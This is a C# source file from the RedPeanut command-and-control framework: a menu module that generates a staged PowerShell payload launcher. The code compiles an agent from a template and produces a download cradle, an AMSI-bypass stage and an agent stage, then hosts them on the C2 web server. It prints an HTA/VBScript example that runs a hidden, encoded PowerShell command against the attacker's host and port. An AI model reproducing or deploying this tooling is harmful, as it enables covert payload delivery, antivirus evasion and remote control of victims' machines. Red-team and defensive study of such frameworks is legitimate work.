//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using static RedPeanut.Utility;
using System.IO;


namespace RedPeanut
{
    public class LauncherPowershellManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set filename", "Set Domain" },
            { "set hosted", "If true add the generated hta to the resources served by webserver" },
            { "set lhost", "Set username" },
            { "set lport", "Set password" },
            { "set profile", "Set profile" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        public void RePrintCLI()
        {
            Utility.RePrintCLI(agent, modulename);
            return;
        }

        IAgentInstance agent = null;
        string modulename = "powershell";
        string filename = null;
        string lhost = null;
        int lport = 0;
        int profile = 0;
        bool hosted = false;

        bool exit = false;

        public LauncherPowershellManager()
        {

        }

        public LauncherPowershellManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                LauncherMenu(input);
            } while (!exit);
        }

        private void LauncherMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set filename":
                            filename = GetParsedSetString(input);
                            break;
                        case "set hosted":
                            hosted = GetParsedSetBool(input);
                            break;
                        case "set lhost":
                            lhost = GetParsedSetString(input);
                            break;
                        case "set lport":
                            lport = GetParsedSetInt(input);
                            break;
                        case "set profile":
                            profile = GetParsedSetInt(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }


        private void Run()
        {
            List<string> args = new List<string>();
            try
            {
                if (string.IsNullOrEmpty(filename) || string.IsNullOrEmpty(lhost) || lport < 1 || profile < 1)
                {
                    return;
                }
                else
                {
                    // Parse .cs sorce and repalce variable
                    string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
                    if (Program.GetC2Manager().GetC2Server().GetProfiles().ContainsKey(profile))
                    {

                        ListenerConfig conf = new ListenerConfig("", lhost, lport, Program.GetC2Manager().GetC2Server().GetProfile(profile), profile);
                        string source = File.ReadAllText(Path.Combine(folderrpath, STAGER_TEMPLATE));
                        source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(),40, conf);

                        string assemblyBase64 = Builder.GenerateDllBase64(source, filename);

                        Dictionary<string, string> arg = new Dictionary<string, string>();
                        arg.Add("#{lhost}", lhost);
                        arg.Add("#{lport}", lport.ToString());

                        string uricontent = Program.GetC2Manager().GetC2Server().GetProfile(profile).ContentUri;

                        uricontent = uricontent.TrimStart('/');
                    
                        if (!uricontent.EndsWith("/"))
                            uricontent += "/";

                        arg.Add("#{uri}", uricontent + "s2_" + filename);

                        byte[] assemblybytte = Convert.FromBase64String(assemblyBase64);
                        string agentCompBase64 = Convert.ToBase64String(CompressAssembly(assemblybytte));

                        Dictionary<string, string> argagent = new Dictionary<string, string>();
                        argagent.Add("#{bytelen}", assemblybytte.Length.ToString());

                        PowershellCradleGenerator gen_s0 = new PowershellCradleGenerator(agentCompBase64, arg);
                        PowershellAmsiGenerator gen_s1 = new PowershellAmsiGenerator(agentCompBase64, arg);
                        PowershellAgentGenerator gen_s2 = new PowershellAgentGenerator(agentCompBase64, argagent);

                        if (hosted)
                        {
                            //Add resource to webserver storage
                            C2Manager c2manager = Program.GetC2Manager();

                            c2manager.GetC2Server().RegisterWebResource(filename, new WebResourceInstance(gen_s1, filename));
                            c2manager.GetC2Server().RegisterWebResource("s2_" + filename, new WebResourceInstance(gen_s2, "s2_" + filename));
                            Console.WriteLine("[*] Resource added to webserver resources");
                            Console.WriteLine("[*] Starting point at https://{0}:{1}/{2}", lhost, lport, uricontent + filename);
                            Console.WriteLine("[*]");
                            Console.WriteLine("[*] Cradle example");
                            Console.WriteLine("[*]");
                            Console.WriteLine("<script language = \"VBScript\">");
                            Console.WriteLine("    Function etaget()");
                            Console.WriteLine("");
                            Console.WriteLine("        Dim ahsten");
                            Console.WriteLine("        Set ahsten = CreateObject(\"Wscript.Shell\")");
                            Console.WriteLine("        ahsten.run \"powershell.exe -nop -w 1 -enc {0}\", 0, true", gen_s0.GetScriptText());
                            Console.WriteLine("    End Function");
                            Console.WriteLine("");
                            Console.WriteLine("    etaget");
                            Console.WriteLine("    self.close");
                            Console.WriteLine("</script>");
                            Console.WriteLine("[*]");
                            return;
                        }
                        else
                        {
                            //Write file to tmp env dir
                            File.WriteAllText(Path.Combine(Path.GetTempPath(),filename), gen_s1.GetScriptText());
                            File.WriteAllText(Path.Combine(Path.GetTempPath(), "s2_" + filename), gen_s2.GetScriptText());

                            Console.WriteLine("[*] {0} Created", Path.Combine(Path.GetTempPath(), filename));
                            Console.WriteLine("[*] {0} Created", Path.Combine(Path.GetTempPath(), "s2_" + filename));
                        }
                    }
                }

            }
            catch (Exception e)
            {
                Console.WriteLine("[*] Error running task build {0}", e.Message);
                return;
            }
        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "filename", filename },
                { "hosted", hosted.ToString() },
                { "lhost", lhost },
                { "lport", lport.ToString() },
                { "profile", profile.ToString() }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}
